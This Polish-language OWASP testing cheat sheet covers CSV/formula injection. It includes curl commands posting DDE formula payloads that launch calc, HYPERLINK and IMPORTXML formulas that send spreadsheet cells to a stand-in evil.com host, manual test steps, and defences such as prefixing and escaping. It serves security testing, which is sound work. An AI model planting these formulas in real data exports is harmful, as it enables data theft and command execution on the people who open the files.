# WSTG-INPV-21 — Testing for CSV Injection

## Cele

- Identify CSV/spreadsheet export features that include untrusted input
- Verify whether attacker-controlled values are interpreted as formulas

## KOMENDY

### Wstrzykiwanie formul do pol eksportowanych do CSV

```bash
curl -X POST "https://TARGET/data" -d "name==cmd|'/C calc'!A0"
curl -X POST "https://TARGET/data" -d "name=+cmd|'/C calc'!A0"
curl -X POST "https://TARGET/data" -d "name=-cmd|'/C calc'!A0"
curl -X POST "https://TARGET/data" -d "name=@SUM(1+1)*cmd|'/C calc'!A0"
curl -X POST "https://TARGET/data" -d "name==HYPERLINK(\"http://evil.com\",\"Click\")"
curl -X POST "https://TARGET/data" -d "name==IMPORTXML(CONCAT(\"http://evil.com/\",CONCATENATE(A2:E2)),\"//a\")"

```

### Pobranie wyeksportowanego CSV i sprawdzenie

```bash
curl -s "https://TARGET/export/csv" -o export.csv
cat export.csv | grep -E "^[=+\-@]"

```

## KOMENDY Z WORDLISTAMI

### PayloadsAllTheThings CSV Injection

```bash
# Referencja: Desktop/WSTG/PayloadsAllTheThings-master/CSV Injection/README.md

```

## WERYFIKACJA MANUALNA (Burp Suite / Przegladarka / DevTools)

1. Zidentyfikuj funkcje eksportu CSV/XLSX
2. Wstaw payloady formul (=, +, -, @) w pola ktore beda eksportowane
3. Pobierz wyeksportowany plik i otworz w Excel
4. Sprawdz czy formuly sa wykonywane
5. Testuj HYPERLINK i IMPORTXML do exfiltracji danych
6. Sprawdz czy aplikacja sanityzuje dane przed eksportem


---

## CHEATSHEET OWASP — Kluczowe wskazówki

> Źródło: OWASP CheatSheetSeries — Input_Validation_Cheat_Sheet.md

### CSV/Formula Injection — czym jest

- Atakujacy wstrzykuje formule Excel/Sheets w dane ktore beda eksportowane do CSV/XLSX
- Payloady: `=CMD("calc")`, `=HYPERLINK("evil.com",1)`, `=IMPORTXML("evil.com/steal","/a")`
- Ofiara otwiera plik w Excel/Sheets → formuly sa wykonywane → exfiltracja danych lub RCE

### Niebezpieczne znaki poczatkowe

- `=` — poczatek formuly Excel
- `+` — poczatek formuly
- `-` — poczatek formuly
- `@` — poczatek formuly (Excel)
- `\t` (tab) — moze byc traktowany jako separator + formula
- `\r`, `\n` — nowa linia moze byc poczatkiem formuly w nastepnej komorce

### Obrona

- **Prefix**: dodaj `'` (apostrof) lub spacje przed wartosciami zaczynajacymi sie od `=`, `+`, `-`, `@`
- **Escapowanie**: zamien `=` na `\=`, `+` na `\+` itd. w danych eksportowanych
- **Walidacja input**: odrzuc dane zaczynajace sie od niebezpiecznych znakow jesli nie sa oczekiwane
- **Content-Type**: ustaw `text/csv` (nie `application/vnd.ms-excel`) — ogranicza automatyczne otwieranie
- **Ostrzezenie uzytkownika**: informuj o ryzyku przy pobieraniu plikow CSV z danymi uzytkownikow

### Testowanie

- Wstaw payloady w pola: komentarze, nazwy, opisy, adresy — cokolwiek co moze byc eksportowane
- Pobierz CSV/XLSX i otworz w Excel — sprawdz czy formuly sa wykonywane
- Testuj: `=1+1`, `=CMD("calc")`, `=HYPERLINK("https://evil.com","click")`, `@SUM(1+1)`

## ROZSZERZENIA BURP SUITE

| Rozszerzenie | Opis | Link |
|---|---|---|
| SocketSleuth | Zaawansowane testowanie bezpieczenstwa WebSocket | [GitHub](https://github.com/snyk/socketsleuth) |
| WebSocket Turbo Intruder | Fuzzowanie wiadomosci WebSocket z custom kodem | [GitHub](https://github.com/Hannah-PortSwigger/WebSocketTurboIntruder) |
